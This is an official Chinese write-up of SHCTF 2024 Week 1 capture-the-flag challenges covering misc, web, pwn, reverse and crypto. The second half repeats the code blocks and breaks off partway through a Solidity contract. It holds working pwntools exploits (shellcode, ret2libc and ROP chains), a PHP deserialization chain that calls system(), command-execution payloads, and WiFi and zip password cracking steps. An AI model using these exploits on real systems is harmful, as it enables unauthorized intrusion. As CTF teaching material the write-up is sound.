# SHCTF-2024-Week1 官方WP

> 原文: https://www.ctfiot.com/209352.html
> ID: 209352

Misc

[WEEK1]Quarantine

结合题目描述和题目名称，关键词搜索很容易定位到Windows defender的隔离文件，例如： https://blog.fox-it.com/2023/12/14/reverse-reveal-recover-windows-defender-quarantine-forensics/

使用了RC4加密且key为硬编码，参考： https://github.com/brad-sp/cuckoo-modified/commit/61087cae2e40c8b26f94162c652b4bc48256264b#diff-a171a256ae06a65170deb04a3ba4c27d5a3bbb5ee767f66465742abe902b5104R185

有很多可用项目，当然厨子直接RC4解密也可以，解密后的base64解码保存为zip，直接字典跑rockyou即可得到解压密码

[WEEK1]拜师之旅①

相关知识请自行搜索了,也是老题目了

010editor或者winhex等工具打开补充png头尾的hex数据即可打开图片

头:89 50 4E 47 0D 0A 1A 0A

尾:AE 42 60 82

查看flag需要修改宽高,将高度从07改08即可(这一步羊驼也能梭)

[Week1]真真假假?遮遮掩掩!

具体知识自行搜索,这里不详细讲了

根据题目及描述推测有伪加密和掩码攻击

第一个zip是伪加密,将下图中选中部分改为00即可

第二个是真加密,在注释处有密码格式提示,掩码爆破弱口令即可

这里提一嘴,很多人直接暴力破解问号处的内容,看到6位的时候不应该第一时间考虑弱口令吗?弱口令和字典是没有提示时爆破需要考虑的,正如Quarantine题目一样,rockyou字典是非常好用的!

[Week1]Rasterizing Traffic

前面流量分析看一下就知道有用的是在PNG文件（手搓一下就能提取了）然后看得出来是光栅，然后能搜到下面脚本

https://github.com/AabyssZG/Raster-Terminator

这里在出题时因为看到了网上有曾哥的一把梭脚本，为了锻炼一下选手就直接在生成光栅的时候把图片模式转换成了灰度图，然后直接运用那个工具爆破是会报错，转换图片为rgb的导出就能用上面的脚本了，也可以自己写个脚本

from PIL import Image
import numpy as np

img = np.array(Image.open(r'./download.png').convert('L')) 

for i in range(5):
    z = np.zeros_like(img)  
    z[:, i::5] = img[:, i::5]  
    Image.fromarray(z).show()

[Week1]有WiFi干嘛不用呢？

把may中所有的数据提取出来做成字典：

cat ./* > output

删一下[]，aircrack-ng爆破即可：

aircrack-ng file -w output

Web

[Week1] poppopop

<?php
class SH {

    public static $Web = false;
    public static $SHCTF = false;
}
class C {
    public $p;

    public function flag()
    {
        ($this->p)();
    }
}
class T{

    public $n;
    public function __destruct()
    {

        SH::$Web = true;
        echo "11";
    }
}
class F {
    public $o;
    public function __toString()
    {
        SH::$SHCTF = true;
        $this->o->flag();
        return "其实。。。。,";
    }
}
class SHCTF {
    public $isyou="system";
    public $flag="cat /f*";
    public function __invoke()
    {
        if (SH::$Web) {

            ($this->isyou)($this->flag);
            echo "小丑竟是我自己呜呜呜~";
        } else {
            echo "小丑别看了!";
        }
    }
}
$a =new T();
$a->n=new F();
$a->n->o=new C();
$a->n->o->p=new SHCTF();
echo base64_encode(serialize($a));

[Week1] jvav

在线执行java代码

需要了解java基本语法以及用java执行系统命令

要注意类名为demo，与demo.java一致

import java.io.BufferedReader;
import java.io.InputStreamReader;

class demo{
    public static void main(String[] args) {
        try {
            Process process = Runtime.getRuntime().exec("cat /flag");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            process.waitFor();
            reader.close();
        } catch (Exception e) {
        }
    }
}

[Week1]单身十八年的手速

需要点击超过520次拿到flag，查看页面源代码，引用了game.js，查看game.js的内容，发现是混淆过后的js，无需去混淆，直接定位520的hex值0x208，发现后面就是alert了一段字符串，base64解密拿到flag，有经验的可以直接定位alert

[Week1]1zflask

根据题目描述，访问/robots.txt，发现/s3recttt路由，访问得到题目源码app.py

/api路由存在命令执行，通过GET参数SSHCTFF提交

import os
import flask
from flask import Flask, request, send_from_directory, send_file

app = Flask(__name__)

@app.route('/api')
def api():
    cmd = request.args.get('SSHCTFF', 'ls /')
    result = os.popen(cmd).read()
    return result
    
@app.route('/robots.txt')
def static_from_root():
    return send_from_directory(app.static_folder,'robots.txt')
    
@app.route('/s3recttt')
def get_source():
    file_path = "app.py"
    return send_file(file_path, as_attachment=True)
 
if __name__ == '__main__':
    app.run(debug=True)

执行ls /发现/flag文件

http://entry.shc.tf:?????/api?SSHCTFF=ls /

执行cat /flag得到flag

[Week1] MD5 Master

MD5强碰撞，指定了前缀为 MD5 master!

用 fastcoll 生成两个前缀为 MD5 master! 且md5一样的文件。

进行URL编码，这里我用PHP写的一个脚本

<?php
$md51=file_get_contents('./md5_msg1.txt');
$md52=file_get_contents('./md5_msg2.txt');
$master = "MD5 master!";

if($md51 !== $md52 && md5($md51)===md5($md52)){
    echo "master1=".urlencode(substr($md51,strlen($master)));
    echo "&";
    echo "master2=".urlencode(substr($md52,strlen($master)));
}

得到

master1=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%11%A2%C0gYM%90iF%B4%05K%F6h%E7%B3%88%0DKc%1Dq%9F%870F%7B%D1%E3%85%28%CD%3A%E3%0E%C4J%ADJ%A2%EB%E7%BB%5C%02%C6%90cg%40%84_8%D5M%AE%CC%88%B6%86Y_%14%29P%1Dd%7B%23%DE%BD%F2%F0%92%FB%82%E1%27%99%95%D1%8F%E1%A8%83%7C%C4%ED%04%89%21xN%EA%09%AF%CDw%F6%A2%60R%E4%88%EA4%F9Y%89%ACJ%7F%14%F9%28%03O%C3%A3%BE%DA%DFW%7E%E6%B0%94%3B&master2=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%11%A2%C0gYM%90iF%B4%05K%F6h%E7%B3%88%0DK%E3%1Dq%9F%870F%7B%D1%E3%85%28%CD%3A%E3%0E%C4J%ADJ%A2%EB%E7%BB%5C%02F%91cg%40%84_8%D5M%AE%CC%88%B6%06Y_%14%29P%1Dd%7B%23%DE%BD%F2%F0%92%FB%82%E1%27%99%95%D1%8F%E1%28%83%7C%C4%ED%04%89%21xN%EA%09%AF%CDw%F6%A2%60R%E4%88%EA4%F9Y%89%2CJ%7F%14%F9%28%03O%C3%A3%BE%DA%DFW%FE%E6%B0%94%3B

用bp或者hackerbar发送过去即可

这里需要注意的细节是，用hackerbar发送时，要在结尾多添加一个 &，因为hackerbar会自动换行

用bp发送时，要把最后的空行删除，不能有多余的东西，或者在结尾多添加一个&

[Week1] 蛐蛐？蛐蛐！

先通过点击发现是向check.php发送，之后通过注释发现源码位置

绕过方法很多很多，单是第一个就可以用114514a或者是科学计数法绕过

第二个很多师傅私聊我说真的能绕么，当然可以，拿分号截断一下就行了嘛，毕竟我只判断了六位（小声蛐蛐

Pwn

[Week1]签个到吧

IDA分析程序,ban了一些东西，而且存在close(1)，那么重定向一下即可：

cat /flag >$2

[Week1]指令执行器

先删除IDA无法识别的部分，查看伪代码发现向栈中写入数据并跳转到栈上去执行写入的数据

但是有check会检查是否有系统调用，我们可以给输入的数据大小设置为0x50f(syscall)然后写入正常的shellcode并去掉syscall，通过nop指令一直执行到syscall

from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./pwn')
payload = asm(shellcraft.sh())[:-2].ljust(0x100, asm('nop'))
p.sendlineafter(b':', str(0x50f))
p.sendafter(b':', payload)
p.interactive()

[Week1]No_stack_overflow1

程序存在一个栈溢出，但是有一个通过strlen检测输入数据长度的逻辑，strlen只会计算x00前字符串的长度，所以可以插入一个x00去绕过strlen的检测，覆盖范围地址劫持控制流，同时程序里面有一个可以getshell的backdoor函数，将返回地址覆盖成backdoor就可以getshell

Exp

from pwn import *
# from LibcSearcher import *
import itertools
import ctypes

context(os='linux', arch='amd64', log_level='debug')

is_debug = 0
IP = "entry.shc.tf"
PORT = 45385

elf = context.binary = ELF('./vuln')
libc = elf.libc

def connect():
    return remote(IP, PORT) if not is_debug else process()

g = lambda x: gdb.attach(x)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x=None: p.recv() if x is None else p.recv(x)
rl = lambda: p.recvline()
ru = lambda x: p.recvuntil(x)
r_leak_libc_64 = lambda: u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
r_leak_libc_32 = lambda: u32(p.recvuntil(b'xf7')[-4:])

p = connect()

backdoor = 0x4011DE

payload = b'x00' * 0x118 + p64(backdoor)

sa(">>>",payload)

p.interactive()

[Week1]No_stack_overflow2

size是使用int类型存储的，然后read函数size这个参数是uint类型的，

可以通过输入一个负数去绕过size的检查并且利用有符号数和无符号数存储的方式构造出一个栈溢出漏洞

相对No_stack_overflow1来说，我们不知道system函数的地址在哪里，需要想方法拿到system函数的地址才能getshell

程序是动态连接的，由于延迟绑定的机制，在函数调用一次后got表对应的项里会存储该函数的地址，可以通过泄露got表的方式拿到该函数的地址，然后通过该函数的偏移和system的偏移计算出system函数的地址

通过puts函数配合程序里pop rdi ret这个gadget就可以泄露地址，泄露地址后返回main函数再打一次rop就好了

from pwn import *
# from LibcSearcher import *
import itertools
import ctypes

context(os='linux', arch='amd64', log_level='debug')

is_debug = 0
IP = "entry.shc.tf"
PORT = 30897

elf = context.binary = ELF('./vuln')
libc = elf.libc

def connect():
    return remote(IP, PORT) if not is_debug else process()

g = lambda x: gdb.attach(x)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x=None: p.recv() if x is None else p.recv(x)
rl = lambda: p.recvline()
ru = lambda x: p.recvuntil(x)
r_leak_libc_64 = lambda: u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
r_leak_libc_32 = lambda: u32(p.recvuntil(b'xf7')[-4:])

p = connect()

sla("size","-1")

pop_rdi_ret = 0x401223
ret = 0x000000000040101a
main = 0x0000000000401228

payload = b'a' * 0x108 + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main)
# g(p)
sa("input",payload)
rl()
leak = u64(r(6).ljust(8,b'x00'))
libc_base = leak - libc.sym['puts']
success(f"libc_base ->{hex(libc_base)}")

system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

sla("size","-1")
payload = b'a' * 0x108 + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system)
sa("input",payload)

p.interactive()

[Week1]No_stack_overflow2_pro

程序逻辑和2相同，但是变成静态链接的，system函数本质上是封装了execve这个系统调用，通过execve系统调用一样可以getshell

首先得往一个可读写已知的地址写入binsh字符串，然后再通过execve系统调用getshell就好了

Exp

from pwn import *
# from LibcSearcher import *
import itertools
import ctypes

context(os='linux', arch='amd64', log_level='debug')

is_debug = 0
IP = "entry.shc.tf"
PORT = 30897

elf = context.binary = ELF('./vuln')
libc = elf.libc

def connect():
    return remote(IP, PORT) if not is_debug else process()

g = lambda x: gdb.attach(x)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x=None: p.recv() if x is None else p.recv(x)
rl = lambda: p.recvline()
ru = lambda x: p.recvuntil(x)
r_leak_libc_64 = lambda: u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
r_leak_libc_32 = lambda: u32(p.recvuntil(b'xf7')[-4:])

p = connect()

pop_rdi_ret = 0x00000000004022bf
pop_rsi_ret = 0x000000000040a32e
pop_rdx_rbx_ret = 0x000000000049d06b
pop_rax_ret = 0x00000000004507f7
bss = 0x4e5000

read = 0x00000000044FD90 
syscall = 0x0000000000402074

payload = flat([
    b'a' * 0x108, 
    pop_rdi_ret, 0, pop_rsi_ret,bss, pop_rdx_rbx_ret, 0x8, 0x0, read,
    pop_rax_ret,0x3b,pop_rdi_ret,bss,pop_rsi_ret,0,pop_rdx_rbx_ret,0,0,syscall
])

sla("size","-1")
sa("input",payload)

time.sleep(0.3)
s(b'/bin/shx00')

p.interactive()

Reverse

[Week1]Ezapk

import base64

key = [12, 15, 25, 30, 36]
enc = "woLDgMOgw7hEwoJQw7zDtsKow7TDpMOMZMOow75QxIbDnsKmw6Z4UMK0w7rCklDCrMKqwqbDtMOOw6DDsg=="

decoded= base64.b64decode(enc)
decoded_text = decoded.decode('utf-8')
    
dec_text = []
    
for i in range(len(decoded_text)):
    enc_char = decoded_text[i]

    enc_char = ord(enc_char)

    enc_char = enc_char // 2

    enc_char = enc_char - 6

    key_byte = key[i % len(key)]
    ori_char = chr(enc_char ^ key_byte)

    dec_text.append(ori_char)
    

print("Flag:", ''.join(dec_text))
# Flag: 7Ush87-akjxcy2Ju-dwia9;JSO-IQixnsm

[Week1]ezxor

#include<iostream>
#include<stdlib.h>
using namespace std;
int main(){
        char data[]={-61,105,114,-60,103,74,-24,17,67,-49,111,0,-13,68,110,-8,89,73,-24,78,94,-30,83,67,-79,92};
        for(int i=0;i<26;i++){
                switch (i%3) {
                case 1:
                        data[i]^=0x21;
                        break;
                case 2:
                        data[i]^=0x31;
                        break;
                default:
                        data[i]^=0x90;
                        break;
                }
        } 
        for(int i=0;i<=25;i++){
        cout<<data[i];
        }
}
#SHCTF{x0r_N1ce_hxxxoorrr!}

[Week1]ezrc4

//#include <stdio.h>
#include <stdlib.h>
#include<string.h>
#include<iostream>
using namespace std;
unsigned char S[256];
void swap(unsigned char *a, unsigned char *b) {
        unsigned char temp = *a;
        *a = *b;
        *b = temp;
}
void rc4_init(unsigned char *key, int key_length, unsigned char *S) {
        int i, j = 0;
        for (i = 0; i < 256; i++)
                S[i] = i;
        
        for (i = 0; i < 256; i++) {
                j = (j + S[i] + key[i % key_length]) % 256;
                swap(&S[i], &S[j]);
        }
}
void rc4_crypt(unsigned char *input, unsigned char *output, int length, unsigned char *S) {
        int i = 0, j = 0, t = 0;
        unsigned char k;
        for (int counter = 0; counter < length; counter++) {
                i = (i + 1) % 256;
                j = (j + S[i]) % 256;
                swap(&S[i], &S[j]);
                t = (S[i] + S[j]) % 256;
                k = S[t];
                output[counter] = (input[counter] ^ k)^102;
        }
}
int main(){
        unsigned char key[]="FenKey!!";
        unsigned char out[255]={0};
        unsigned char data[255]={33,171,63,66,101,143,60,91,12,23,5,110,132,231,26,105,195,119,112,31,17};
        rc4_init(key,8,S);
        rc4_crypt(data, out, 21, S);
        cout<<out;        
}
#SHCTF{rc4_nice_ez!!!}

[Week1]EzDBG

Minidump文件用WinDBG打开，它会自动加载.pdb符号文件。

用lm命令列出已有模块：

查看EzDBG的详细信息：

找一下EzDBG的符号都有哪些，找到main函数：

即可在反汇编窗口查看main函数的汇编：

本题后期改了一次附件，改后结果与上图有些不同，开启了栈Cookie保护。具体解密方法很简单，即单字节异或0x66。看到其中enc符号是比较的密文，其后面紧跟该符号地址：

解密脚本:

[Week1]gamegame

签到数独题，随便在线网站或者脚本都能出，完成后会得到提示，flag就是输入的答案，提取包裹shctf{}即可

Crypto

[Week1] factor

yafu分解N得到10个小素数，之后对10个素数选7个进行排列组合


```
from PIL import Image
import numpy as np

img = np.array(Image.open(r'./download.png').convert('L')) 

for i in range(5):
    z = np.zeros_like(img)  
    z[:, i::5] = img[:, i::5]  
    Image.fromarray(z).show()
```



```
cat ./* > output
```



```
aircrack-ng file -w output
```



```
<?php
class SH {

    public static $Web = false;
    public static $SHCTF = false;
}
class C {
    public $p;

    public function flag()
    {
        ($this->p)();
    }
}
class T{

    public $n;
    public function __destruct()
    {

        SH::$Web = true;
        echo "11";
    }
}
class F {
    public $o;
    public function __toString()
    {
        SH::$SHCTF = true;
        $this->o->flag();
        return "其实。。。。,";
    }
}
class SHCTF {
    public $isyou="system";
    public $flag="cat /f*";
    public function __invoke()
    {
        if (SH::$Web) {

            ($this->isyou)($this->flag);
            echo "小丑竟是我自己呜呜呜~";
        } else {
            echo "小丑别看了!";
        }
    }
}
$a =new T();
$a->n=new F();
$a->n->o=new C();
$a->n->o->p=new SHCTF();
echo base64_encode(serialize($a));
```



```
import java.io.BufferedReader;
import java.io.InputStreamReader;

class demo{
    public static void main(String[] args) {
        try {
            Process process = Runtime.getRuntime().exec("cat /flag");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            process.waitFor();
            reader.close();
        } catch (Exception e) {
        }
    }
}
```



```
import os
import flask
from flask import Flask, request, send_from_directory, send_file

app = Flask(__name__)

@app.route('/api')
def api():
    cmd = request.args.get('SSHCTFF', 'ls /')
    result = os.popen(cmd).read()
    return result
    
@app.route('/robots.txt')
def static_from_root():
    return send_from_directory(app.static_folder,'robots.txt')
    
@app.route('/s3recttt')
def get_source():
    file_path = "app.py"
    return send_file(file_path, as_attachment=True)
 
if __name__ == '__main__':
    app.run(debug=True)
```



```
<?php
$md51=file_get_contents('./md5_msg1.txt');
$md52=file_get_contents('./md5_msg2.txt');
$master = "MD5 master!";

if($md51 !== $md52 && md5($md51)===md5($md52)){
    echo "master1=".urlencode(substr($md51,strlen($master)));
    echo "&";
    echo "master2=".urlencode(substr($md52,strlen($master)));
}
```



```
master1=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%11%A2%C0gYM%90iF%B4%05K%F6h%E7%B3%88%0DKc%1Dq%9F%870F%7B%D1%E3%85%28%CD%3A%E3%0E%C4J%ADJ%A2%EB%E7%BB%5C%02%C6%90cg%40%84_8%D5M%AE%CC%88%B6%86Y_%14%29P%1Dd%7B%23%DE%BD%F2%F0%92%FB%82%E1%27%99%95%D1%8F%E1%A8%83%7C%C4%ED%04%89%21xN%EA%09%AF%CDw%F6%A2%60R%E4%88%EA4%F9Y%89%ACJ%7F%14%F9%28%03O%C3%A3%BE%DA%DFW%7E%E6%B0%94%3B&master2=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%11%A2%C0gYM%90iF%B4%05K%F6h%E7%B3%88%0DK%E3%1Dq%9F%870F%7B%D1%E3%85%28%CD%3A%E3%0E%C4J%ADJ%A2%EB%E7%BB%5C%02F%91cg%40%84_8%D5M%AE%CC%88%B6%06Y_%14%29P%1Dd%7B%23%DE%BD%F2%F0%92%FB%82%E1%27%99%95%D1%8F%E1%28%83%7C%C4%ED%04%89%21xN%EA%09%AF%CDw%F6%A2%60R%E4%88%EA4%F9Y%89%2CJ%7F%14%F9%28%03O%C3%A3%BE%DA%DFW%FE%E6%B0%94%3B
```



```
cat /flag >$2
```



```
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./pwn')
payload = asm(shellcraft.sh())[:-2].ljust(0x100, asm('nop'))
p.sendlineafter(b':', str(0x50f))
p.sendafter(b':', payload)
p.interactive()
```



```
from pwn import *
# from LibcSearcher import *
import itertools
import ctypes

context(os='linux', arch='amd64', log_level='debug')

is_debug = 0
IP = "entry.shc.tf"
PORT = 45385

elf = context.binary = ELF('./vuln')
libc = elf.libc

def connect():
    return remote(IP, PORT) if not is_debug else process()

g = lambda x: gdb.attach(x)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x=None: p.recv() if x is None else p.recv(x)
rl = lambda: p.recvline()
ru = lambda x: p.recvuntil(x)
r_leak_libc_64 = lambda: u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
r_leak_libc_32 = lambda: u32(p.recvuntil(b'xf7')[-4:])

p = connect()

backdoor = 0x4011DE

payload = b'x00' * 0x118 + p64(backdoor)

sa(">>>",payload)

p.interactive()
```



```
from pwn import *
# from LibcSearcher import *
import itertools
import ctypes

context(os='linux', arch='amd64', log_level='debug')

is_debug = 0
IP = "entry.shc.tf"
PORT = 30897

elf = context.binary = ELF('./vuln')
libc = elf.libc

def connect():
    return remote(IP, PORT) if not is_debug else process()

g = lambda x: gdb.attach(x)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x=None: p.recv() if x is None else p.recv(x)
rl = lambda: p.recvline()
ru = lambda x: p.recvuntil(x)
r_leak_libc_64 = lambda: u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
r_leak_libc_32 = lambda: u32(p.recvuntil(b'xf7')[-4:])

p = connect()

sla("size","-1")

pop_rdi_ret = 0x401223
ret = 0x000000000040101a
main = 0x0000000000401228

payload = b'a' * 0x108 + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main)
# g(p)
sa("input",payload)
rl()
leak = u64(r(6).ljust(8,b'x00'))
libc_base = leak - libc.sym['puts']
success(f"libc_base ->{hex(libc_base)}")

system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

sla("size","-1")
payload = b'a' * 0x108 + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system)
sa("input",payload)

p.interactive()
```



```
from pwn import *
# from LibcSearcher import *
import itertools
import ctypes

context(os='linux', arch='amd64', log_level='debug')

is_debug = 0
IP = "entry.shc.tf"
PORT = 30897

elf = context.binary = ELF('./vuln')
libc = elf.libc

def connect():
    return remote(IP, PORT) if not is_debug else process()

g = lambda x: gdb.attach(x)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x=None: p.recv() if x is None else p.recv(x)
rl = lambda: p.recvline()
ru = lambda x: p.recvuntil(x)
r_leak_libc_64 = lambda: u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
r_leak_libc_32 = lambda: u32(p.recvuntil(b'xf7')[-4:])

p = connect()

pop_rdi_ret = 0x00000000004022bf
pop_rsi_ret = 0x000000000040a32e
pop_rdx_rbx_ret = 0x000000000049d06b
pop_rax_ret = 0x00000000004507f7
bss = 0x4e5000

read = 0x00000000044FD90 
syscall = 0x0000000000402074

payload = flat([
    b'a' * 0x108, 
    pop_rdi_ret, 0, pop_rsi_ret,bss, pop_rdx_rbx_ret, 0x8, 0x0, read,
    pop_rax_ret,0x3b,pop_rdi_ret,bss,pop_rsi_ret,0,pop_rdx_rbx_ret,0,0,syscall
])

sla("size","-1")
sa("input",payload)

time.sleep(0.3)
s(b'/bin/shx00')

p.interactive()
```



```
import base64

key = [12, 15, 25, 30, 36]
enc = "woLDgMOgw7hEwoJQw7zDtsKow7TDpMOMZMOow75QxIbDnsKmw6Z4UMK0w7rCklDCrMKqwqbDtMOOw6DDsg=="

decoded= base64.b64decode(enc)
decoded_text = decoded.decode('utf-8')
    
dec_text = []
    
for i in range(len(decoded_text)):
    enc_char = decoded_text[i]

    enc_char = ord(enc_char)

    enc_char = enc_char // 2

    enc_char = enc_char - 6

    key_byte = key[i % len(key)]
    ori_char = chr(enc_char ^ key_byte)

    dec_text.append(ori_char)
    

print("Flag:", ''.join(dec_text))
# Flag: 7Ush87-akjxcy2Ju-dwia9;JSO-IQixnsm
```



```
#include<iostream>
#include<stdlib.h>
using namespace std;
int main(){
        char data[]={-61,105,114,-60,103,74,-24,17,67,-49,111,0,-13,68,110,-8,89,73,-24,78,94,-30,83,67,-79,92};
        for(int i=0;i<26;i++){
                switch (i%3) {
                case 1:
                        data[i]^=0x21;
                        break;
                case 2:
                        data[i]^=0x31;
                        break;
                default:
                        data[i]^=0x90;
                        break;
                }
        } 
        for(int i=0;i<=25;i++){
        cout<<data[i];
        }
}
#SHCTF{x0r_N1ce_hxxxoorrr!}
```



```
//#include <stdio.h>
#include <stdlib.h>
#include<string.h>
#include<iostream>
using namespace std;
unsigned char S[256];
void swap(unsigned char *a, unsigned char *b) {
        unsigned char temp = *a;
        *a = *b;
        *b = temp;
}
void rc4_init(unsigned char *key, int key_length, unsigned char *S) {
        int i, j = 0;
        for (i = 0; i < 256; i++)
                S[i] = i;
        
        for (i = 0; i < 256; i++) {
                j = (j + S[i] + key[i % key_length]) % 256;
                swap(&S[i], &S[j]);
        }
}
void rc4_crypt(unsigned char *input, unsigned char *output, int length, unsigned char *S) {
        int i = 0, j = 0, t = 0;
        unsigned char k;
        for (int counter = 0; counter < length; counter++) {
                i = (i + 1) % 256;
                j = (j + S[i]) % 256;
                swap(&S[i], &S[j]);
                t = (S[i] + S[j]) % 256;
                k = S[t];
                output[counter] = (input[counter] ^ k)^102;
        }
}
int main(){
        unsigned char key[]="FenKey!!";
        unsigned char out[255]={0};
        unsigned char data[255]={33,171,63,66,101,143,60,91,12,23,5,110,132,231,26,105,195,119,112,31,17};
        rc4_init(key,8,S);
        rc4_crypt(data, out, 21, S);
        cout<<out;        
}
#SHCTF{rc4_nice_ez!!!}
```



```
from Crypto.Util.number import *
import itertools
import gmpy2

def euler_phi(iterable):
    result = 1
    for num in iterable:
        result *= (num-1)
    return result
def prod(iterable):
    result = 1
    for num in iterable:
        result *= num
    return result
c = 83203354443691475236566731315885209850712905561683246635494880779210768362320832871594893125899064482788803620121715203387342275170950
N = 705489637689051650495174075199456599608406389508428101084628634963919394623137059785601933728282388128796949031265526970761112358266036965714097232361625743624385075217393911048026324761194431
e = 65537
prime_list = [10721086187325103399,17776230585248364091,15131713702415385611,12631137889156627663,16694564042697614449,15198819432927171347,18418933010365133927,14057998718837106443,17932329510254500553,16438870286806305937]
p_list  = list(itertools.combinations(prime_list, 7))
for i in p_list:
    phi = euler_phi(i)
    n = prod(i)
    try:
        d = gmpy2.invert(e,phi)
        m = pow(c,d,n)
        flag = long_to_bytes(m)
        if b'SHCTF' in flag:
            print(flag)
            break
    except:
        pass
```



```
from Crypto.Util.number import *
import gmpy2
from tqdm import *

c = 79650255924640441243783174315738119783087054428100187253964031045992984620971879440861726176524336451142891982435118150281255051661584547445199746244544425882305155402589125955199617147930949561958885307377843571691020998368159145257218511196817046406536607508747287748359813285385239057197003234628847079939
leak = -2599222796268155672542615057820311188233596084301204730398124299903057773299164321565684294941437840950319988869184017952143214614546298874735930095707443093006166798980132582791121684360595863075969212106829764572515951966651060430710482809252673230819220874013454674514944846921907088042630911813223918291506413183923253016666716689505955468069348342349098701467897450818524506135076565
r = 587682058314915471307923755715428788638634300872408087916288745237852083576968681013764877646877289262026854782255141434805121509775923799604299891162530112557931041695494035876437072363827072790300504458703299756480581043027342577811
t = 786699786866467436790075506076086854735027138153074424854186047828932863337885476336794620298737490235145874475196933459185319123588161523141227394517491113980132701124357536717210954797397468992341668471278315484594606850091171557027
e = 65537
for tmp in trange(2**14,2**15-1):
    if isPrime(tmp):
        p = (leak+tmp)*gmpy2.invert(r,t) % t
        try:
            d = gmpy2.invert(e,p-1)
            m = pow(c,d,p)
            flag = long_to_bytes(m)
            if b'SHCTF' in flag:
                print(flag)
                break
        except:
            pass
```



```
from Crypto.Util.number import *
from Crypto.Cipher import AES
import os
c = b'[x1bx0cxdbx9dxc0xe4Wxe1xddixd8.xbaW-x80xe1xc4Lx9exc3Lx9ex0bxadvx94-=xa2xf4x98xf9xa2xfdxbcxc5xc9xf7xd4x88V:xfexedxf6+'
iv = b'M<Ix18xf4xcaxb42xd1xf2:`cx1ctx9d'
key = b'Jlexabx9cxd8}x85xc4xf1/tx02xdaz_'
my_aes = AES.new(key, AES.MODE_CBC, iv)
m = my_aes.decrypt(c)
print(m)
#SHCTF{a66b6526-ae7f-4538-8d68-cef4e71e6afd}
```



```
from Crypto.Util.number import *
import gmpy2
import sympy
from tqdm import*
c = 7619231789171995079294161234878423224231112429961838535540784984692964815324726959511719538222968332975752824731741518178086141907611550871403019016043596256109736194533826456432379700265157548262751707387902955474794955342745211189261217839388458558541610855570638979485715875458613584721374740387313646656453429749782646888147442107673006666786913122872882361836572072790817898782976016388830432654146591375959261230147062213668563221742359906177903255156356636148427480411387914934792027752124681828051885054176487796901097076771710538908474521518771489253933284065313644010703407250057718304709566471764216008833
d = 4294890607908962616910170813936418137933989254123469803555687713508290441430349302109331416858412706457372735008848759911973894659751982291314717306592060486109717936934227859107527548007636110978177943504153504830427399670018088103145473328301738295079451783784918523654258608563796681268583347612365317742686170548984200881695503824129779720121644547769626667999547773210219170161559351337037056795720068516329254135806201887544486689070012222188533868735009912244250883223795602440999145676619713422671945150578230992434086632731164719925391045521061782211037385447361025091612158568846980146769425987904420426593
e = 65537
kphi = e*d-1
for i in trange(2**13,2**17):
    if kphi%i == 0:
        phi = kphi//i
        temp = gmpy2.iroot(phi,2)[0]
        p = gmpy2.next_prime(temp)
        q = sympy.prevprime(temp)
        if d == inverse(e,(p-1)*(q-1)):
            m = pow(c,d,p*q)
            print(long_to_bytes(m))
#SHCTF{8d4d7826-0a81-4914-98db-9574d3bcf620}
```



```
from Crypto.Util.number import long_to_bytes
import libnum

m = 45539805380440641872365156183094421676774006568277726863510027015198537050186948229611640574904985469

print(long_to_bytes(m))
print(libnum.n2s(m))
print(bytes.fromhex(hex(m)[2:]))
```



```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract WelcomeSHCTF2024 {

 string private storedFlag;

 constructor(string memory flag) {
 string memory xorResult = xorWithSHCTF(flag);
 storedFlag = xorResult;
 }

 function xorWithSHCTF(string memory flag) internal pure returns (string memory) {
 bytes memory flagBytes = bytes(flag);
 bytes memory xorKey = bytes("shctf");
